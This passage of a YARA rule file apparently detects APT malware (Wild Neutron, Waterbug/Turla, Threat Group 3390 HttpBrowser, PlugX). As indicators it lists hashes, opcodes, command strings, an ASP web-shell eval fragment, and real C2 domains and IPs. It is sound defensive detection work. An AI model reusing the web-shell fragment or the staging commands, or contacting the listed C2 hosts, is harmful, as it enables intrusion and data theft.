$s10 = "%SYSTEMROOT%\\System32\\iastor32.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
$s11 = "%SYSTEMROOT%\\SysWOW64\\mshtaex.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
$x1 = "wdigestEx.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00' */
$x2 = "dpcore16t.dll" fullword ascii /* score: '21.00' */
$x3 = "mspool.dll" fullword ascii /* score: '21.00' */
$x4 = "msvcse.exe" fullword ascii /* score: '20.00' */
$x5 = "mshtaex.exe" fullword wide /* score: '20.00' */
$x6 = "iastor32.exe" fullword ascii /* score: '20.00' */
$y1 = "Installer.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00' */
$y2 = "Info: Process %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00' */
$y3 = "Error: GetFileTime %s 0x%x" fullword ascii /* score: '17.00' */
$y4 = "Install succeeded" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
$y5 = "Error: RegSetValueExA 0x%x" fullword ascii /* score: '9.00' */
condition:
uint16(0) == 0x5a4d and filesize < 400KB and ( $n1 or ( 1 of ($s*) and 1 of ($x*) and 3 of ($y*)))
}
rule SSC_WildNeutron_Sample_9
{
meta:
description = "Wild Neutron APT Sample Rule - file 781eb1e17349009fbae46aea5c59d8e5b68ae0b42335cb035742f6b0f4e4087e"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "781eb1e17349009fbae46aea5c59d8e5b68ae0b42335cb035742f6b0f4e4087e"
strings:
$s0 = "http://get.adobe.com/flashplayer/" fullword wide /* PEStudio Blacklist: strings */ /* score: '30.00' */
$s1 = "xxxxxxxxxxxxxxxxxxxx" fullword wide /* reversed goodware string 'xxxxxxxxxxxxxxxxxxxx' */ /* score: '19.00' */
$s4 = " Player Installer/Uninstaller" fullword wide /* PEStudio Blacklist: strings */ /* score: '11.42' */
$s5 = "Adobe Flash Plugin Updater" fullword wide /* PEStudio Blacklist: strings */ /* score: '11.00' */
$s6 = "uSOFTWARE\\Adobe" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.42' */
$s11 = "2008R2" fullword wide /* PEStudio Blacklist: os */ /* score: '8.00' */
$s12 = "%02d.%04d.%s" fullword wide /* score: '7.02' */
$s13 = "%d -> %d" fullword wide /* score: '7.00' */
condition:
uint16(0) == 0x5a4d and filesize < 500KB and all of them
}
rule SSC_WildNeutron_javacpl
{
meta:
description = "Wild Neutron APT Sample Rule - from files 683f5b476f8ffe87ec22b8bab57f74da4a13ecc3a5c2cbf951999953c2064fc9, 758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92, 8ca7ed720babb32a6f381769ea00e16082a563704f8b672cb21cf11843f4da7a"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
super_rule = 1
hash1 = "683f5b476f8ffe87ec22b8bab57f74da4a13ecc3a5c2cbf951999953c2064fc9"
hash2 = "758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92"
hash3 = "8ca7ed720babb32a6f381769ea00e16082a563704f8b672cb21cf11843f4da7a"
strings:
$x1 = "javacpl.exe" fullword wide /* score: '3.00' */ /* Goodware String - occured 2 times */
$s0 = "RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00' */
$s1 = "Error executing CreateProcess()!!" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00' */
$s2 = "http://www.java.com/en/download/installed.jsp?detect=jre" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */
$s3 = "RunFile: couldn't load SHELL32.DLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
$s4 = "Process is not running any more" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00' */
$s6 = "Windows NT Version %lu.%lu" fullword wide /* PEStudio Blacklist: os */ /* score: '19.00' */
$s7 = "Usage: destination [reference]" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00' */
$s8 = "Invalid input handle!!!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
$s9 = ".com;.exe;.bat;.cmd" fullword wide /* score: '15.00' */
$s10 = ") -%s-> %s (" fullword ascii /* score: '14.00' */
$s11 = "cmdextversion" fullword wide /* score: '14.00' */
$s12 = "Invalid pid (%s)" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00' */
$s13 = "\"%s\" /K %s" fullword wide /* score: '11.02' */
$s14 = "Error setting %s (%s)" fullword wide /* score: '11.00' */
$s16 = "cmdcmdline" fullword wide /* score: '11.00' */
$s39 = "2008R2" fullword ascii /* PEStudio Blacklist: os */ /* score: '8.00' */
condition:
uint16(0) == 0x5a4d and filesize < 1677KB and all of them
}
rule SSC_WildNeutron_Sample_1
{
meta:
description = "Wild Neutron APT Sample Rule - file 2b5065a3d0e0b8252a987ef5f29d9e1935c5863f5718b83440e68dc53c21fa94"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "2b5065a3d0e0b8252a987ef5f29d9e1935c5863f5718b83440e68dc53c21fa94"
strings:
$s0 = "LiveUpdater.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00' */
$s1 = "id-at-postalAddress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */
$s2 = "%d -> %d (default)" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
$s3 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
$s8 = "id-ce-keyUsage" fullword ascii /* score: '12.00' */
$s9 = "Key Usage" fullword ascii /* score: '12.00' */
$s32 = "UPDATE_ID" fullword wide /* PEStudio Blacklist: strings */ /* score: '9.00' */
$s37 = "id-at-commonName" fullword ascii /* score: '8.00' */
$s38 = "2008R2" fullword wide /* PEStudio Blacklist: os */ /* score: '8.00' */
$s39 = "RSA-alt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00' */
$s40 = "%02d.%04d.%s" fullword wide /* score: '7.02' */
condition:
uint16(0) == 0x5a4d and filesize < 800KB and all of them
}
rule SSC_WildNeutron_Sample_5
{
meta:
description = "Wild Neutron APT Sample Rule - file 1604e36ccef5fa221b101d7f043ad7f856b84bf1a80774aa33d91c2a9a226206"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "1604e36ccef5fa221b101d7f043ad7f856b84bf1a80774aa33d91c2a9a226206"
strings:
$s0 = "LiveUpdater.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00' */
$s1 = "id-at-postalAddress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */
$s2 = "%d -> %d (default)" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
$s3 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
$s4 = "sha-1WithRSAEncryption" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
$s5 = "Postal code" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.00' */
$s6 = "id-ce-keyUsage" fullword ascii /* score: '12.00' */
$s7 = "Key Usage" fullword ascii /* score: '12.00' */
$s8 = "TLS-RSA-WITH-3DES-EDE-CBC-SHA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00' */
$s9 = "%02d.%04d.%s" fullword wide /* score: '7.02' */
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}
rule SSC_WildNeutron_Sample_8
{
meta:
description = "Wild Neutron APT Sample Rule - file 758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92"
strings:
$x1 = "RunFile: couldn't load SHELL32.DLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
$x2 = "RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00' */
$x3 = "Error executing CreateProcess()!!" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00' */
$x4 = "cmdcmdline" fullword wide /* score: '11.00' */
$x5 = "Invalid input handle!!!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
$s1 = "Process %d terminated" fullword wide /* PEStudio Blacklist: strings */ /* score: '24.00' */
$s2 = "Process is not running any more" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00' */
$s3 = "javacpl.exe" fullword wide /* score: '3.00' */ /* Goodware String - occured 2 times */
$s4 = "Windows NT Version %lu.%lu" fullword wide /* PEStudio Blacklist: os */ /* score: '19.00' */
$s5 = "Usage: destination [reference]" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00' */
$s6 = ".com;.exe;.bat;.cmd" fullword wide /* score: '15.00' */
$s7 = ") -%s-> %s (" fullword ascii /* score: '14.00' */
$s8 = "cmdextversion" fullword wide /* score: '14.00' */
$s9 = "Invalid pid (%s)" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00' */
$s10 = "\"%s\" /K %s" fullword wide /* score: '11.02' */
$s11 = "Error setting %s (%s)" fullword wide /* score: '11.00' */
$s12 = "DEBUG: Cannot allocate memory for ptrNextNode->ptrNext!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
$s13 = "Failed to build full directory path" fullword wide /* score: '10.00' */
$s14 = "DEBUG: Cannot allocate memory for ptrFileArray!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00' */
$s15 = "%-8s %-3s  %*s %s  %s" fullword wide /* score: '8.00' */
$s16 = " %%%c in (%s) do " fullword wide /* score: '8.00' */
condition:
uint16(0) == 0x5a4d and filesize < 1677KB and 2 of ($x*) and 6 of ($s*)
}
rule SSC_WildNeutron_Sample_3
{
meta:
description = "Wild Neutron APT Sample Rule - file c2c761cde3175f6e40ed934f2e82c76602c81e2128187bab61793ddb3bc686d0"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "c2c761cde3175f6e40ed934f2e82c76602c81e2128187bab61793ddb3bc686d0"
strings:
$x1 = "178.162.197.9" fullword ascii /* score: '9.00' */
$x2 = "\"http://fw.ddosprotected.eu:80 /opts resolv=drfx.chickenkiller.com\"" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00' */
$x3 = ".chickenkiller.com" ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */
$s1 = "LiveUpdater.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00' */
$s2 = "id-at-postalAddress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */
$s3 = "%d -> %d (default)" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
$s4 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
$s5 = "id-at-serialNumber" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
$s6 = "ECDSA with SHA256" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
$s7 = "Acer LiveUpdater" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00' */
condition:
uint16(0) == 0x5a4d and filesize < 2020KB and ( 1 of ($x*) or all of ($s*) )
}
rule SSC_generic_carbon
{
strings:
$s1 = "ModStart"
$s2 = "ModuleStart"
$t1 = "STOP|OK"
$t2 = "STOP|KILL"
condition:
(uint16(0) == 0x5a4d) and (1 of ($s*)) and (1 of ($t*))
}
rule SSC_WaterBug_wipbot_2013_dll
{
meta:
description = "Symantec Waterbug Attack - Trojan.Wipbot 2014 Down.dll component"
author = "Symantec Security Response"
date = "22.01.2015"
reference = "http://t.co/rF35OaAXrl"
strings:
$string1 = "/%s?rank=%s"
$string2 = "ModuleStart\x00ModuleStop\x00start"
$string3 = "1156fd22-3443-4344-c4ffff"
//read file... error..
$string4 = "read\x20file\x2E\x2E\x2E\x20error\x00\x00"
condition:
2 of them
}
rule SSC_WaterBug_fa_malware
{
meta:
description = "Symantec Waterbug Attack - FA malware variant"
author = "Symantec Security Response"
date = "22.01.2015"
reference = "http://t.co/rF35OaAXrl"
strings:
$mz = "MZ"
$string1 = "C:\\proj\\drivers\\fa _ 2009\\objfre\\i386\\atmarpd.pdb"
$string2 = "d:\\proj\\cn\\fa64\\"
$string3 = "sengoku_Win32.sys\x00"
$string4 = "rk_ntsystem.c"
$string5 = "\\uroboros\\"
$string6 = "shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}"
condition:
($mz at 0) and (any of ($string*))
}
rule SSC_WaterBug_sav
{
meta:
description = "Symantec Waterbug Attack - SAV Malware"
author = "Symantec Security Response"
date = "22.01.2015"
reference = "http://t.co/rF35OaAXrl"
strings:
$mz = "MZ"
$code1a = { 8B 75 18 31 34 81 40 3B C2 72 F5 33 F6 39 7D 14 76 1B 8A 04 0E 88 04 0F 6A 0F 33 D2 8B C7 5B F7 F3 85 D2 75 01 }
$code1b = { 8B 45 F8 40 89 45 F8 8B 45 10 C1 E8 02 39 45 F8 73 17 8B 45 F8 8B 4D F4 8B 04 81 33 45 20 8B 4D F8 8B 55 F4 89 04 8A EB D7 83 65 F8 00 83 65 EC 00 EB 0E 8B 45 F8 40 89 45 F8 8B 45 EC 40 89 45 EC 8B 45 EC 3B 45 10 73 27 8B 45 F4 03 45 F8 8B 4D F4 03 4D EC 8A 09 88 08 8B 45 F8 33 D2 6A 0F 59 F7 F1 85 D2 75 07 }
$code1c = { 8A 04 0F 88 04 0E 6A 0F 33 D2 8B C6 5B F7 F3 85 D2 75 01 47 8B 45 14 46 47 3B F8 72 E3 EB 04 C6 04 08 00 48 3B C6 73 F7 33 C0 C1 EE 02 74 0B 8B 55 18 31 14 81 40 3B C6 72 F5 }
$code2 =  { 29 5D 0C 8B D1 C1 EA 05 2B CA 8B 55 F4 2B C3 3D 00 00 00 01 89 0F 8B 4D 10 8D 94 91 00 03 00 00 73 17 8B 7D F8 8B 4D 0C 0F B6 3F C1 E1 08 0B CF C1 E0 08 FF 45 F8 89 4D 0C 8B 0A 8B F8 C1 EF 0B}
condition:
($mz at 0) and (($code1a or $code1b or $code1c) and $code2)
}
rule SSC_WaterBug_wipbot_2013_core_PDF
{
meta:
description = "Symantec Waterbug Attack - Trojan.Wipbot 2014 core PDF"
author = "Symantec Security Response"
date = "22.01.2015"
reference = "http://t.co/rF35OaAXrl"
strings:
$PDF = "%PDF-"
$a = /\+[A-Za-z]{1}\. _ _ \$\+[A-Za-z]{1}\. _ \$ _ \+/
$b = /\+[A-Za-z]{1}\.\$\$\$ _ \+/
condition:
($PDF at 0) and #a > 150 and #b > 200
}
rule SSC_WaterBug_wipbot_2013_core
{
meta:
description = "Symantec Waterbug Attack - Trojan.Wipbot core + core; garbage appended data (PDF Exploit leftovers) + wipbot dropper; fake AdobeRd32 Error"
author = "Symantec Security Response"
date = "22.01.2015"
reference = "http://t.co/rF35OaAXrl"
strings:
$mz = "MZ"
$code1 = { 89 47 0C C7 47 10 90 C2 04 00 C7 47 14 90 C2 10 00 C7 47 18 90 90 60 68 89 4F 1C C7 47 20 90 90 90 B8 89 4F 24 C7 47 28 90 FF D0 61 C7 47 2C 90 C2 04 00}
$code2 = { 85 C0 75 25 8B 0B BF ?? ?? ?? ?? EB 17 69 D7 0D 66 19 00 8D BA 5F F3 6E 3C 89 FE C1 EE 10 89 F2 30 14 01 40 3B 43 04 72 E4}
$code3 = {90 90 90 ?? B9 00 4D 5A 90 00 03 00 00 00 82 04} $code4 = {55 89 E5 5D C3 55 89 E5 83 EC 18 8B 45 08 85 C0}
condition:
$mz at 0 and (($code1 or $code2) or ($code3 and $code4))
}
rule SSC_WaterBug_turla_dropper
{
meta:
description = "Symantec Waterbug Attack - Trojan Turla Dropper"
author = "Symantec Security Response"
date = "22.01.2015"
reference = "http://t.co/rF35OaAXrl"
strings:
$a = {0F 31 14 31 20 31 3C 31 85 31 8C 31 A8 31 B1 31 D1 31 8B 32 91 32 B6 32 C4 32 6C 33 AC 33 10 34}
$b = {48 41 4C 2E 64 6C 6C 00 6E 74 64 6C 6C 00 00 00 57 8B F9 8B 0D ?? ?? ?? ?? ?? C9 75 26 56 0F 20 C6 8B C6 25 FF FF FE FF 0F 22 C0 E8}
condition:
all of them
}
rule SSC_HttpBrowser_RAT_Sample2
{
meta:
description = "Threat Group 3390 APT Sample - HttpBrowser RAT Sample"
author = "Florian Roth"
reference = "http://snip.ly/giNB"
date = "2015-08-06"
score = 80
hash1 = "c57c5a2c322af2835ae136b75283eaaeeaa6aa911340470182a9983ae47b8992"
strings:
$s0 = "nKERNEL32.DLL" fullword wide
$s1 = "WUSER32.DLL" fullword wide
$s2 = "mscoree.dll" fullword wide
$s3 = "VPDN_LU.exeUT" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 250KB and all of them
}
rule SSC_ThreatGroup3390_Strings
{
meta:
description = "Threat Group 3390 APT - Strings"
author = "Florian Roth"
reference = "http://snip.ly/giNB"
date = "2015-08-06"
score = 60
strings:
$s1 = "\"cmd\" /c cd /d \"c:\\Windows\\Temp\\\"&copy" ascii
$s2 = "svchost.exe a -k -r -s -m5 -v1024000 -padmin-windows2014"
$s3 = "ren *.rar *.zip" fullword ascii
$s4 = "c:\\temp\\ipcan.exe" fullword ascii
$s5 = "<%eval(Request.Item(\"admin-na-google123!@#" ascii
condition:
1 of them and filesize < 30KB
}
rule SSC_HttpBrowser_RAT_dropper_Gen2
{
meta:
description = "Threat Group 3390 APT Sample - HttpBrowser RAT Dropper"
author = "Florian Roth"
reference = "http://snip.ly/giNB"
date = "2015-08-06"
score = 70
hash1 = "c57c5a2c322af2835ae136b75283eaaeeaa6aa911340470182a9983ae47b8992"
hash2 = "dfa984174268a9f364d856fd47cfaca75804640f849624d69d81fcaca2b57166"
strings:
$s1 = "navlu.dll.urlUT" fullword ascii
$s2 = "VPDN_LU.exeUT" fullword ascii
$s3 = "pnipcn.dllUT" fullword ascii
$s4 = "\\ssonsvr.exe" fullword ascii
$s5 = "/c del /q %s" fullword ascii
$s6 = "\\setup.exe" fullword ascii
$s7 = "msi.dllUT" fullword ascii
$op0 = { 8b 45 0c 83 38 00 0f 84 98 } /* Opcode */
$op1 = { e8 dd 07 00 00 ff 35 d8 fb 40 00 8b 35 7c a0 40 } /* Opcode */
$op2 = { 83 fb 08 75 2c 8b 0d f8 af 40 00 89 4d dc 8b 0d } /* Opcode */
$op3 = { c7 43 18 8c 69 40 00 e9 da 01 00 00 83 7d f0 00 } /* Opcode */
$op4 = { 6a 01 e9 7c f8 ff ff bf 1a 40 00 96 1b 40 00 01 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 400KB and 3 of ($s*) and 1 of ($op*)
}
rule SSC_PlugX_NvSmartMax_Gen
{
meta:
description = "Threat Group 3390 APT Sample - PlugX NvSmartMax Generic"
author = "Florian Roth"
reference = "http://snip.ly/giNB"
date = "2015-08-06"
score = 70
hash1 = "718fc72942b9b706488575c0296017971170463f6f40fa19b08fc84b79bf0cef"
hash2 = "1c0379481d17fc80b3330f148f1b87ff613cfd2a6601d97920a0bcd808c718d0"
hash3 = "555952aa5bcca4fa5ad5a7269fece99b1a04816d104ecd8aefabaa1435f65fa5"
hash4 = "71f7a9da99b5e3c9520bc2cc73e520598d469be6539b3c243fb435fe02e44338"
hash5 = "65bbf0bd8c6e1ccdb60cf646d7084e1452cb111d97d21d6e8117b1944f3dc71e"
strings:
$s0 = "NvSmartMax.dll" fullword ascii
$s1 = "NvSmartMax.dll.url" fullword ascii
$s2 = "Nv.exe" fullword ascii
$s4 = "CryptProtectMemory failed" fullword ascii
$s5 = "CryptUnprotectMemory failed" fullword ascii
$s7 = "r%.*s(%d)%s" fullword wide
$s8 = " %s CRC " fullword wide
$op0 = { c6 05 26 49 42 00 01 eb 4a 8d 85 00 f8 ff ff 50 } /* Opcode */
$op1 = { 8d 85 c8 fe ff ff 50 8d 45 c8 50 c6 45 47 00 e8 } /* Opcode */
$op2 = { e8 e6 65 00 00 50 68 10 43 41 00 e8 56 84 00 00 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 800KB and all of ($s*) and 1 of ($op*)
}
rule SSC_HttpBrowser_RAT_Sample1
{
meta:
description = "Threat Group 3390 APT Sample - HttpBrowser RAT Sample update.hancominc.com"
author = "Florian Roth"
reference = "http://snip.ly/giNB"
date = "2015-08-06"
score = 80
hash1 = "be334d1f8fa65a723af65200a166c2bbdb06690c8b30fafe772600e4662fc68b"
hash2 = "1052ad7f4d49542e4da07fa8ea59c15c40bc09a4d726fad023daafdf05866ebb"
strings:
$s0 = "update.hancominc.com" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 100KB and $s0
}
rule SSC_ThreatGroup3390_C2
{
meta:
description = "Threat Group 3390 APT - C2 Server"
author = "Florian Roth"
reference = "http://snip.ly/giNB"
date = "2015-08-06"
score = 60
strings:
$s1 = "api.apigmail.com"
$s2 = "apigmail.com"
$s3 = "backup.darkhero.org"
$s4 = "bel.updatawindows.com"
$s5 = "binary.update-onlines.org"
$s6 = "blackcmd.com"
$s7 = "castle.blackcmd.com"
$s8 = "ctcb.blackcmd.com"
$s9 = "darkhero.org"
$s10 = "dav.local-test.com"
$s11 = "test.local-test.com"
$s12 = "dev.local-test.com"
$s13 = "ocean.local-test.com"
$s14 = "ga.blackcmd.com"
$s15 = "helpdesk.blackcmd.com"
$s16 = "helpdesk.csc-na.com"
$s17 = "helpdesk.hotmail-onlines.com"
$s18 = "helpdesk.lnip.org"
$s19 = "hotmail-onlines.com"
$s20 = "jobs.hotmail-onlines.com"
$s21 = "justufogame.com"
$s22 = "lnip.org"
$s23 = "local-test.com"
$s24 = "login.hansoftupdate.com"
$s25 = "long.update-onlines.org"
$s26 = "longlong.update-onlines.org"
$s27 = "longshadow.dyndns.org"
$s28 = "longshadow.update-onlines.org"
$s29 = "longykcai.update-onlines.org"
$s30 = "lostself.update-onlines.org"
$s31 = "mac.navydocument.com"
$s32 = "mail.csc-na.com"
$s33 = "mantech.updatawindows.com"
$s34 = "micr0soft.org"
$s35 = "microsoft-outlook.org"
$s36 = "mtc.navydocument.com"
$s37 = "navydocument.com"
$s38 = "mtc.update-onlines.org"
$s39 = "news.hotmail-onlines.com"
$s40 = "oac.3322.org"
$s41 = "ocean.apigmail.com"
$s42 = "pchomeserver.com"
$s43 = "registre.organiccrap.com"
$s44 = "security.pomsys.org"
$s45 = "services.darkhero.org"
$s46 = "sgl.updatawindows.com"
$s47 = "shadow.update-onlines.org"
$s48 = "sonoco.blackcmd.com"
$s49 = "test.logmastre.com"
$s50 = "up.gtalklite.com"
$s51 = "updatawindows.com"
$s52 = "update-onlines.org"
$s53 = "update.deepsoftupdate.com"
$s54 = "update.hancominc.com"
$s55 = "update.micr0soft.org"
$s56 = "update.pchomeserver.com"
$s57 = "urs.blackcmd.com"
$s58 = "wang.darkhero.org"
$s59 = "webs.local-test.com"
$s60 = "word.apigmail.com"
$s61 = "wordpress.blackcmd.com"
$s62 = "working.blackcmd.com"
$s63 = "working.darkhero.org"
$s64 = "working.hotmail-onlines.com"
$s65 = "www.trendmicro-update.org"
$s66 = "www.update-onlines.org"
$s67 = "x.apigmail.com"
$s68 = "ykcai.update-onlines.org"
$s69 = "ykcailostself.dyndns-free.com"
$s70 = "ykcainobody.dyndns.org"
$s71 = "zj.blackcmd.com"
$s72 = "laxness-lab.com"
$s73 = "google-ana1ytics.com"
$s74 = "www.google-ana1ytics.com"
$s75 = "ftp.google-ana1ytics.com"
$s76 = "hotmailcontact.net"
$s77 = "208.115.242.36"
$s78 = "208.115.242.37"
$s79 = "208.115.242.38"
$s80 = "66.63.178.142"
$s81 = "72.11.148.220"
$s82 = "72.11.141.133"
$s83 = "74.63.195.236"
$s84 = "74.63.195.236"
$s85 = "74.63.195.237"
$s86 = "74.63.195.238"
$s87 = "103.24.0.142"
$s88 = "103.24.1.54"
$s89 = "106.187.45.162"
$s90 = "192.151.236.138"
$s91 = "192.161.61.19"
$s92 = "192.161.61.20"
$s93 = "192.161.61.22"
$s94 = "103.24.1.54"
$s95 = "67.215.232.179"
$s96 = "96.44.177.195"
$s97 = "49.143.192.221"
$s98 = "67.215.232.181"
$s99 = "67.215.232.182"
$s100 = "96.44.182.243"
$s101 = "96.44.182.245"
$s102 = "96.44.182.246"
$s103 = "49.143.205.30"
$s104 = "working_success@163.com"
$s105 = "ykcaihyl@163.com"
$s106 = "working_success@163.com"
$s107 = "yuming@yinsibaohu.aliyun.com"
condition:
uint16(0) == 0x5a4d and 1 of them
}
rule SSC_HttpBrowser_RAT_Gen
{
meta:
description = "Threat Group 3390 APT Sample - HttpBrowser RAT Generic"
author = "Florian Roth"
reference = "http://snip.ly/giNB"
date = "2015-08-06"
score = 90
hash1 = "0299493ccb175d452866f5e21d023d3e92cd8d28452517d1d19c0f05f2c5ca27"
hash2 = "065d055a90da59b4bdc88b97e537d6489602cb5dc894c5c16aff94d05c09abc7"
hash3 = "05c7291db880f94c675eea336ecd66338bd0b1d49ad239cc17f9df08106e6684"
hash4 = "07133f291fe022cd14346cd1f0a649aa2704ec9ccadfab809ca9c48b91a7d81b"
hash5 = "0f8893e87ddec3d98e39a57f7cd530c28e36d596ea0a1d9d1e993dc2cae0a64d"
hash6 = "108e6633744da6efe773eb78bd0ac804920add81c3dde4b26e953056ac1b26c5"
hash7 = "1052ad7f4d49542e4da07fa8ea59c15c40bc09a4d726fad023daafdf05866ebb"
hash8 = "1277ede988438d4168bb5b135135dd3b9ae7d9badcdf1421132ca4692dd18386"
hash9 = "19be90c152f7a174835fd05a0b6f722e29c648969579ed7587ae036679e66a7b"
hash10 = "1e7133bf5a9fe5e462321aafc2b7770b8e4183a66c7fef14364a0c3f698a29af"
hash11 = "2264e5e8fcbdcb29027798b200939ecd8d1d3ad1ef0aef2b8ce7687103a3c113"
hash12 = "2a1bdeb0a021fb0bdbb328bd4b65167d1f954c871fc33359cb5ea472bad6e13e"
hash13 = "259a2e0508832d0cf3f4f5d9e9e1adde17102d2804541a9587a9a4b6f6f86669"
hash14 = "240d9ce148091e72d8f501dbfbc7963997d5c2e881b4da59a62975ddcbb77ca2"
hash15 = "211a1b195cf2cc70a2caf8f1aafb8426eb0e4bae955e85266490b12b5322aa16"
hash16 = "2d25c6868c16085c77c58829d538b8f3dbec67485f79a059f24e0dce1e804438"
hash17 = "2d932d764dd9b91166361d8c023d64a4480b5b587a6087b0ce3d2ac92ead8a7d"
hash18 = "3556722d9aa37beadfa6ba248a66576f767e04b09b239d3fb0479fa93e0ba3fd"
hash19 = "365e1d4180e93d7b87ba28ce4369312cbae191151ac23ff4a35f45440cb9be48"
hash20 = "36c49f18ce3c205152eef82887eb3070e9b111d35a42b534b2fb2ee535b543c0"
hash21 = "3eeb1fd1f0d8ab33f34183893c7346ddbbf3c19b94ba3602d377fa2e84aaad81"
hash22 = "3fa8d13b337671323e7fe8b882763ec29b6786c528fa37da773d95a057a69d9a"
strings:
$s0 = "%d|%s|%04d/%02d/%02d %02d:%02d:%02d|%ld|%d" fullword wide
$s1 = "HttpBrowser/1.0" fullword wide
$s2 = "set cmd : %s" ascii fullword
$s3 = "\\config.ini" wide fullword
condition:
uint16(0) == 0x5a4d and filesize < 45KB and filesize > 20KB and all of them
}
rule SSC_HttpBrowser_RAT_dropper_Gen1
{
meta:
description = "Threat Group 3390 APT Sample - HttpBrowser RAT Dropper"
author = "Florian Roth"
reference = "http://snip.ly/giNB"
date = "2015-08-06"
score = 70
hash1 = "808de72f1eae29e3c1b2c32be1b84c5064865a235866edf5e790d2a7ba709907"
hash2 = "f6f966d605c5e79de462a65df437ddfca0ad4eb5faba94fc875aba51a4b894a7"
hash3 = "f424965a35477d822bbadb821125995616dc980d3d4f94a68c87d0cd9b291df9"
hash4 = "01441546fbd20487cb2525a0e34e635eff2abe5c3afc131c7182113220f02753"
hash5 = "8cd8159f6e4689f572e2087394452e80e62297af02ca55fe221fe5d7570ad47b"
hash6 = "10de38419c9a02b80ab7bf2f1f1f15f57dbb0fbc9df14b9171dc93879c5a0c53"
hash7 = "c2fa67e970d00279cec341f71577953d49e10fe497dae4f298c2e9abdd3a48cc"
strings:
$x1 = "1001=cmd.exe" fullword ascii
$x2 = "1003=ShellExecuteA" fullword ascii
$x3 = "1002=/c del /q %s" fullword ascii
$x4 = "1004=SetThreadPriority" fullword ascii
/* $s1 = "pnipcn.dllUT" fullword ascii
$s2 = "ssonsvr.exeUT" fullword ascii
$s3 = "navlu.dllUT" fullword ascii
$s4 = "@CONOUT$" fullword wide
$s5 = "VPDN_LU.exeUT" fullword ascii
$s6 = "msi.dll.urlUT" fullword ascii
$s7 = "setup.exeUT" fullword ascii
$s8 = "pnipcn.dll.urlUT" fullword ascii
$s9 = "ldvpreg.exeUT" fullword ascii */
$op0 = { e8 71 11 00 00 83 c4 10 ff 4d e4 8b f0 78 07 8b } /* Opcode */
$op1 = { e8 85 34 00 00 59 59 8b 86 b4 } /* Opcode */
$op2 = { 8b 45 0c 83 38 00 0f 84 97 } /* Opcode */
